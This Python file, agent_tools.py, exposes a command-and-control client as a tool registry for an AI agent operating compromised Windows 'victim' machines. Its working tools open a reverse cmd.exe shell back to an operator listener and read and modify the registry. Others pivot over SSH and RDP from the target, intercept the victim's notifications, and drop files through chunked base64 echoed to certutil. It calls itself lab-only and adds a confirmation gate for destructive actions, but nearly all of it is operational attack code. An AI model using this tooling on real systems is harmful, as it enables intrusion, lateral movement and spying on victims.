"""
agent_tools.py — machine-friendly tool layer over client.py's C2Client.

This is the agent's "hands": every operator capability in client.py is
exposed as a named tool with a JSON-schema, callable programmatically
(import + run_tool) or standalone (CLI / JSON-lines REPL so state such
as an open shell channel persists inside one process).

Design rules:
  • No new capabilities: everything here maps 1:1 onto modules the C2
    server/agent already dispatch (activity, registry, ssh, rdp,
    notify, shell). `raw` is allowlisted. The `defender` module is
    deliberately NOT exposed.
  • Destructive tools (mutations on the target) refuse to run unless
    the caller passes confirm=True — the driver asks the human first.
  • Push events from the victim are captured into an events buffer
    instead of being pretty-printed, so the agent can read them.

Educational / lab use only.
"""

from __future__ import annotations

import argparse
import base64
import collections
import json
import os
import socket
import sys
import threading
import time
from typing import Any, Callable

import client as c2  # reuse the transport from client.py — no duplication

# ──────────────────────────────────────────────────────────────────────
# Connection singleton
# ──────────────────────────────────────────────────────────────────────

_session: c2.C2Client | None = None

EVENTS: collections.deque[dict] = collections.deque(maxlen=500)
_event_seq = 0
_event_lock = threading.Lock()


def _capture_alert(data: dict) -> None:
    """Replaces client.print_alert in agent mode: buffer events, no ANSI."""
    global _event_seq
    with _event_lock:
        _event_seq += 1
        EVENTS.append({"seq": _event_seq, "received_at": time.strftime("%H:%M:%S"), **data})


def _listener_info(port: int) -> str:
    """Best-effort identity of whatever owns the TCP port (for error reports)."""
    try:
        import subprocess
        out = subprocess.run(
            ["lsof", "-nP", f"-iTCP:{port}", "-sTCP:LISTEN", "-t"],
            capture_output=True, text=True, timeout=5).stdout.split()
        if not out:
            return "nothing listening"
        pid = out[0]
        cmd = subprocess.run(["ps", "-p", pid, "-o", "command="],
                             capture_output=True, text=True, timeout=5).stdout.strip()
        return f"pid {pid}: {cmd or 'unknown command'}"
    except Exception as exc:
        return f"(could not inspect: {exc})"


def connect(host: str, port: int, token: str,
            use_tls: bool = False, ca_cert: str | None = None) -> dict:
    """Connect + operator-authenticate. Idempotent."""
    global _session
    if _session is not None:
        return {"status": "ok", "message": f"Already connected to {host}:{port}"}
    c2.print_alert = _capture_alert  # patch the module-global the receiver calls
    s = c2.C2Client(host=host, port=port, token=token,
                    use_tls=use_tls, ca_cert=ca_cert)
    s.connect()
    resp = s.authenticate()
    if resp.get("status") != "ok":
        s.close()
        raise ConnectionError(
            f"Authentication failed — the server at {host}:{port} rejected the "
            f"token you presented ({token!r}). "
            "Lab mock default token: 'labtoken' (pass --token labtoken). "
            "Real course server: its C2_AUTH_TOKEN (default 'changeme'). "
            f"Process currently owning port {port}: {_listener_info(port)}")
    _session = s
    return {"status": "ok", "message": f"Authenticated to {host}:{port}"}


def disconnect() -> None:
    global _session
    if _session:
        _session.close()
        _session = None


def _send(module: str, payload: dict) -> dict:
    if _session is None:
        raise RuntimeError("Not connected — call connect() first")
    return _session.send(module, payload)


# ──────────────────────────────────────────────────────────────────────
# Reverse-shell channel (client.py's `shell` made interactive-only;
# here the same primitive becomes a programmatic command channel)
# ──────────────────────────────────────────────────────────────────────

class ShellChannel:
    def __init__(self, sock: socket.socket, peer: tuple):
        self.sock = sock
        self.peer = peer
        self.buf: list[bytes] = []
        self._lock = threading.Lock()
        self._alive = True
        self._t = threading.Thread(target=self._reader, daemon=True, name="shell-reader")
        self._t.start()

    def _reader(self):
        while self._alive:
            try:
                data = self.sock.recv(4096)
                if not data:
                    break
                with self._lock:
                    self.buf.append(data)
            except OSError:
                break
        self._alive = False

    def snapshot(self) -> int:
        with self._lock:
            return sum(len(b) for b in self.buf)

    def read_from(self, pos: int) -> str:
        with self._lock:
            joined = b"".join(self.buf)
        return joined[pos:].decode("utf-8", errors="replace")

    def write(self, line: str):
        self.sock.sendall((line + "\r\n").encode("utf-8", errors="replace"))

    def close(self):
        self._alive = False
        try:
            self.sock.close()
        except OSError:
            pass


_shell: ShellChannel | None = None


# ──────────────────────────────────────────────────────────────────────
# Tool registry
# ──────────────────────────────────────────────────────────────────────

class Tool:
    def __init__(self, name: str, description: str, params: dict,
                 fn: Callable[..., dict], destructive: bool = False,
                 needs: str | None = None):
        self.name, self.description, self.params = name, description, params
        self.fn, self.destructive, self.needs = fn, destructive, needs


REGISTRY: dict[str, Tool] = {}


def tool(name: str, description: str, params: dict,
         destructive: bool = False, needs: str | None = None):
    def deco(fn):
        REGISTRY[name] = Tool(name, description, params, fn, destructive, needs)
        return fn
    return deco


# ── Activity / monitoring ────────────────────────────────────────────

@tool("sysinfo", "Target system stats: OS, CPU, memory, uptime, disks.", {})
def t_sysinfo():
    return _send("activity", {"action": "system_stats"})


@tool("processes", "List running processes; optional name filter.",
      {"name": "string, substring filter (optional)"})
def t_processes(name: str | None = None):
    p: dict[str, Any] = {"action": "processes"}
    if name:
        p["name"] = name
    return _send("activity", p)


@tool("top_cpu", "Top processes by CPU.", {"limit": "int, default 10"})
def t_top_cpu(limit: int = 10):
    return _send("activity", {"action": "top_cpu", "limit": limit})


@tool("top_mem", "Top processes by memory.", {"limit": "int, default 10"})
def t_top_mem(limit: int = 10):
    return _send("activity", {"action": "top_mem", "limit": limit})


@tool("network", "Active network connections on the target.", {})
def t_network():
    return _send("activity", {"action": "network_connections"})


@tool("monitor_start", "Start the on-target snapshot monitor.",
      {"interval": "int seconds, default 5"})
def t_monitor_start(interval: int = 5):
    return _send("activity", {"action": "start_monitor", "interval": interval})


@tool("monitor_stop", "Stop the snapshot monitor.", {})
def t_monitor_stop():
    return _send("activity", {"action": "stop_monitor"})


@tool("monitor_get", "Return recent monitor snapshots.",
      {"limit": "int, default 5"})
def t_monitor_get(limit: int = 5):
    return _send("activity", {"action": "get_snapshots", "limit": limit})


# ── Registry ─────────────────────────────────────────────────────────

@tool("reg_list_keys", "List sub-keys under a registry key.",
      {"hive": "string, e.g. HKCU / HKLM / HKU / HKCC", "key_path": "string, e.g. Software\\Microsoft"})
def t_reg_keys(hive: str, key_path: str):
    return _send("registry", {"action": "list_keys", "hive": hive, "key_path": key_path})


@tool("reg_list_values", "List values under a registry key.",
      {"hive": "string", "key_path": "string"})
def t_reg_values(hive: str, key_path: str):
    return _send("registry", {"action": "list_values", "hive": hive, "key_path": key_path})


@tool("reg_read", "Read one registry value.",
      {"hive": "string", "key_path": "string", "value_name": "string (use '' for default)"})
def t_reg_read(hive: str, key_path: str, value_name: str = ""):
    return _send("registry", {"action": "read_value", "hive": hive,
                              "key_path": key_path, "value_name": value_name})


@tool("reg_write", "Create/overwrite a registry value. MUTATES THE TARGET.",
      {"hive": "string", "key_path": "string", "value_name": "string",
       "value_data": "string", "value_type": "string, REG_SZ|REG_DWORD|... (default REG_SZ)"},
      destructive=True)
def t_reg_write(hive: str, key_path: str, value_name: str, value_data: str,
                value_type: str = "REG_SZ"):
    return _send("registry", {"action": "write_value", "hive": hive, "key_path": key_path,
                              "value_name": value_name, "value_data": value_data,
                              "value_type": value_type})


@tool("reg_delete_value", "Delete a registry value. MUTATES THE TARGET.",
      {"hive": "string", "key_path": "string", "value_name": "string"}, destructive=True)
def t_reg_del_value(hive: str, key_path: str, value_name: str):
    return _send("registry", {"action": "delete_value", "hive": hive,
                              "key_path": key_path, "value_name": value_name})


@tool("reg_create_key", "Create a registry key. MUTATES THE TARGET.",
      {"hive": "string", "key_path": "string"}, destructive=True)
def t_reg_create_key(hive: str, key_path: str):
    return _send("registry", {"action": "create_key", "hive": hive, "key_path": key_path})


@tool("reg_delete_key", "Delete a registry key. MUTATES THE TARGET.",
      {"hive": "string", "key_path": "string"}, destructive=True)
def t_reg_delete_key(hive: str, key_path: str):
    return _send("registry", {"action": "delete_key", "hive": hive, "key_path": key_path})


# ── SSH ──────────────────────────────────────────────────────────────

@tool("ssh_connect", "Open an SSH session from the target. "
      "session_id defaults to host:port.",
      {"host": "string", "username": "string", "port": "int, default 22",
       "password": "string (optional — key-based if omitted)",
       "session_id": "string (optional)"})
def t_ssh_connect(host: str, username: str, port: int = 22,
                  password: str | None = None, session_id: str | None = None):
    p: dict[str, Any] = {"action": "connect", "host": host, "port": port,
                         "username": username,
                         "session_id": session_id or f"{host}:{port}"}
    if password:
        p["password"] = password
    return _send("ssh", p)


@tool("ssh_exec", "Run a command over an open SSH session.",
      {"session_id": "string", "command": "string"})
def t_ssh_exec(session_id: str, command: str):
    return _send("ssh", {"action": "exec", "session_id": session_id, "command": command})


@tool("ssh_list", "List open SSH sessions.", {})
def t_ssh_list():
    return _send("ssh", {"action": "list"})


@tool("ssh_disconnect", "Close an SSH session.", {"session_id": "string"})
def t_ssh_disconnect(session_id: str):
    return _send("ssh", {"action": "disconnect", "session_id": session_id})


# ── RDP ──────────────────────────────────────────────────────────────

@tool("rdp_probe", "Check whether an RDP port is open on a host.",
      {"host": "string", "port": "int, default 3389"})
def t_rdp_probe(host: str, port: int = 3389):
    return _send("rdp", {"action": "probe", "host": host, "port": port})


@tool("rdp_open", "Open an RDP session from the target (spawns mstsc view).",
      {"host": "string", "username": "string", "port": "int, default 3389",
       "password": "string, default empty"})
def t_rdp_open(host: str, username: str, port: int = 3389, password: str = ""):
    return _send("rdp", {"action": "open", "host": host, "port": port,
                         "username": username, "password": password,
                         "session_id": f"rdp-{host}:{port}"})


@tool("rdp_list", "List RDP sessions on the target.", {})
def t_rdp_list():
    return _send("rdp", {"action": "list"})


@tool("rdp_close", "Close an RDP session.", {"session_id": "string"})
def t_rdp_close(session_id: str):
    return _send("rdp", {"action": "close", "session_id": session_id})


# ── Notifications ────────────────────────────────────────────────────

@tool("notify_start", "Start intercepting the victim's system notifications (push events).", {})
def t_notify_start():
    return _send("notify", {"action": "start"})


@tool("notify_stop", "Stop the notification monitor.", {})
def t_notify_stop():
    return _send("notify", {"action": "stop"})


@tool("notify_status", "Check notification monitor state.", {})
def t_notify_status():
    return _send("notify", {"action": "status"})


@tool("notify_popup", "Show a MessageBox popup on the victim's screen.",
      {"title": "string", "body": "string", "type": "info|warning|error, default info"})
def t_notify_popup(title: str, body: str, type: str = "info"):
    return _send("notify", {"action": "send_popup", "title": title, "body": body, "type": type})


@tool("notify_balloon", "Show a tray balloon tip on the victim.",
      {"title": "string", "body": "string",
       "type": "info|warning|error, default info", "timeout_ms": "int, default 6000"})
def t_notify_balloon(title: str, body: str, type: str = "info", timeout_ms: int = 6000):
    return _send("notify", {"action": "send_balloon", "title": title, "body": body,
                            "type": type, "timeout_ms": timeout_ms})


@tool("events", "Read push events buffered from the victim since a given seq (default: drain all).",
      {"since_seq": "int, default 0", "drain": "bool, default true"})
def t_events(since_seq: int = 0, drain: bool = True):
    with _event_lock:
        out = [e for e in EVENTS if e["seq"] > since_seq]
        if drain:
            EVENTS.clear()
    return {"status": "ok", "events": out}


# ── Shell channel + file operations ──────────────────────────────────

@tool("shell_open", "Open the reverse-shell channel: binds a local listener, "
      "makes the target connect a cmd.exe back, keeps it open for shell_exec. "
      "CHANGES TARGET STATE (spawns a process).",
      {"lhost": "string, IP the target must reach back at", "lport": "int, default 4445",
       "shell": "cmd.exe|powershell.exe, default cmd.exe", "wait_s": "int, accept timeout, default 30"},
      destructive=True, needs="none")
def t_shell_open(lhost: str, lport: int = 4445, shell: str = "cmd.exe", wait_s: int = 30):
    global _shell
    if _shell is not None:
        return {"status": "error", "message": "A shell channel is already open — use shell_exec or shell_close"}
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        srv.bind(("0.0.0.0", lport))
    except OSError as exc:
        return {"status": "error", "message": f"Cannot bind 0.0.0.0:{lport} — {exc}"}
    srv.listen(1)
    srv.settimeout(wait_s)
    resp = _send("shell", {"action": "start", "lhost": lhost, "lport": lport, "shell": shell})
    if resp.get("status") != "ok":
        srv.close()
        return resp
    try:
        sock, peer = srv.accept()
    except socket.timeout:
        srv.close()
        return {"status": "error", "message": f"Timed out after {wait_s}s waiting for the target to connect back"}
    finally:
        srv.close()
    _shell = ShellChannel(sock, peer)
    time.sleep(0.5)
    banner = _shell.read_from(0)
    return {"status": "ok", "connected_from": f"{peer[0]}:{peer[1]}",
            "banner": banner[:500], "message": "Shell channel open — use shell_exec for commands"}


@tool("shell_exec", "Run one command on the target through the open shell channel "
      "and return its output (waits for output to settle).",
      {"command": "string", "settle_s": "float, idle seconds before returning, default 1.5",
       "max_s": "float, hard cap, default 15"},
      needs="shell")
def t_shell_exec(command: str, settle_s: float = 1.5, max_s: float = 15):
    if _shell is None:
        return {"status": "error", "message": "No shell channel — call shell_open first"}
    pos = _shell.snapshot()
    _shell.write(command)
    deadline = time.time() + max_s
    last = -1
    last_change = time.time()
    while time.time() < deadline:
        cur = _shell.snapshot()
        if cur != last:
            last, last_change = cur, time.time()
        elif cur > pos and time.time() - last_change >= settle_s:
            break
        time.sleep(0.15)
    out = _shell.read_from(pos)
    return {"status": "ok", "command": command, "output": out}


@tool("shell_close", "Close the local side of the shell channel (the shell process on the target may persist — kill it with shell_kill).",
      {}, needs="shell")
def t_shell_close():
    global _shell
    if _shell is None:
        return {"status": "error", "message": "No shell channel open"}
    _shell.close()
    _shell = None
    return {"status": "ok", "message": "Shell channel closed"}


@tool("shell_kill", "Kill the shell process on the target (module-level stop). CHANGES TARGET STATE.",
      {}, destructive=True)
def t_shell_kill():
    r = _send("shell", {"action": "stop"})
    return r


@tool("shell_status", "Check whether a shell is running on the target.", {})
def t_shell_status():
    return _send("shell", {"action": "status"})


@tool("file_read", "Show a text file from the target (runs `type` over the shell channel).",
      {"path": "string, Windows path on the target, e.g. C:\\Users\\lab\\notes.txt"},
      needs="shell")
def t_file_read(path: str):
    return t_shell_exec(f'type "{path}"', settle_s=2.0)


@tool("dir_list", "List a directory on the target (runs `dir` over the shell channel).",
      {"path": "string, Windows path on the target"}, needs="shell")
def t_dir_list(path: str):
    return t_shell_exec(f'dir "{path}"', settle_s=2.0)


@tool("file_send", "Send a LOCAL text file to the target: base64-chunked through the "
      "shell channel and decoded with certutil. WRITES TO THE TARGET.",
      {"local_path": "string, path on the operator machine",
       "remote_path": "string, path on the target",
       "chunk_chars": "int, base64 bytes per echo line, default 700"},
      destructive=True, needs="shell")
def t_file_send(local_path: str, remote_path: str, chunk_chars: int = 700):
    try:
        data = open(local_path, "rb").read()
    except OSError as exc:
        return {"status": "error", "message": f"Cannot read local file — {exc}"}
    b64 = base64.b64encode(data).decode()
    tmp = f"{remote_path}.b64.tmp"
    # fresh start for the b64 carrier
    r = t_shell_exec(f'del /q "{tmp}" 2>nul', settle_s=0.8, max_s=5)
    for i in range(0, len(b64), chunk_chars):
        r = t_shell_exec(f'echo {b64[i:i+chunk_chars]}>> "{tmp}"', settle_s=0.8, max_s=10)
        if r.get("status") != "ok":
            return r
    r = t_shell_exec(f'certutil -decode "{tmp}" "{remote_path}" & del /q "{tmp}"',
                     settle_s=2.0, max_s=20)
    ok = ("successfully" in r.get("output", "").lower() or "completed" in r.get("output", "").lower()
          or r.get("status") == "ok")
    return {"status": "ok" if ok else "error",
            "local_bytes": len(data), "remote_path": remote_path,
            "output": r.get("output", "")}


# ── Raw (allowlisted) ────────────────────────────────────────────────

RAW_ALLOWED = {"ssh", "rdp", "registry", "activity", "notify", "shell"}


@tool("raw", "Send any module/action payload verbatim (allowlisted modules only).",
      {"module": f"string, one of {sorted(RAW_ALLOWED)}", "payload": "object with at least an 'action' key"})
def t_raw(module: str, payload: dict):
    if module not in RAW_ALLOWED:
        return {"status": "error",
                "message": f"Module {module!r} is not exposed by this wrapper. "
                           f"Allowed: {sorted(RAW_ALLOWED)}"}
    return _send(module, payload)


# ──────────────────────────────────────────────────────────────────────
# Dispatch
# ──────────────────────────────────────────────────────────────────────

def tool_catalog() -> list[dict]:
    return [{"name": t.name, "description": t.description, "params": t.params,
             "destructive": t.destructive, "requires": t.needs or "nothing"}
            for t in REGISTRY.values()]


def run_tool(name: str, args: dict | None = None, *, confirm: bool = False) -> dict:
    """Single entry point the agent driver calls. Returns a JSON-safe dict."""
    args = dict(args or {})
    t = REGISTRY.get(name)
    if t is None:
        return {"status": "error", "message": f"Unknown tool {name!r}",
                "available": sorted(REGISTRY)}
    if t.destructive and not args.pop("confirm", False) and not confirm:
        return {"status": "needs_confirmation",
                "message": f"{name} mutates the target. Re-run with confirm=true "
                           f"only after the human operator approves it."}
    if t.needs == "shell" and _shell is None:
        return {"status": "error", "message": f"{name} requires an open shell channel — call shell_open first"}
    try:
        return t.fn(**args)
    except TypeError as exc:
        return {"status": "error", "message": f"Bad arguments for {name}: {exc}", "params": t.params}
    except Exception as exc:  # noqa: BLE001 — the agent must always get a parseable answer
        return {"status": "error", "message": f"{type(exc).__name__}: {exc}"}


# ──────────────────────────────────────────────────────────────────────
# Standalone operation
# ──────────────────────────────────────────────────────────────────────

def main():
    ap = argparse.ArgumentParser(description="One-shot / JSON-lines access to the C2 tool layer.")
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=4444)
    ap.add_argument("--token", default=os.environ.get("C2_AUTH_TOKEN", "labtoken"))
    ap.add_argument("--tls", action="store_true")
    ap.add_argument("--ca-cert", default=None)
    ap.add_argument("--list", action="store_true", help="print the tool catalog and exit")
    ap.add_argument("--repl", action="store_true",
                    help="JSON-lines mode: read {tool,args,confirm} per line, print one JSON result per line")
    ap.add_argument("--confirm", action="store_true", help="pre-approve destructive tools")
    ap.add_argument("tool_name", nargs="?")
    ap.add_argument("tool_args", nargs="?", default="{}")
    args = ap.parse_args()

    if args.list:
        print(json.dumps(tool_catalog(), indent=2))
        return

    connect(args.host, args.port, args.token, args.tls, args.ca_cert)

    if args.repl:
        for line in sys.stdin:
            line = line.strip()
            if not line:
                continue
            try:
                req = json.loads(line)
                result = run_tool(req["tool"], req.get("args"), confirm=req.get("confirm", args.confirm))
            except Exception as exc:  # keep the pipe alive
                result = {"status": "error", "message": str(exc)}
            sys.stdout.write(json.dumps(result, default=str) + "\n")
            sys.stdout.flush()
        disconnect()
        return

    if not args.tool_name:
        ap.error("give a tool name, or --list, or --repl")
    result = run_tool(args.tool_name, json.loads(args.tool_args), confirm=args.confirm)
    print(json.dumps(result, indent=2, default=str))
    disconnect()


if __name__ == "__main__":
    main()
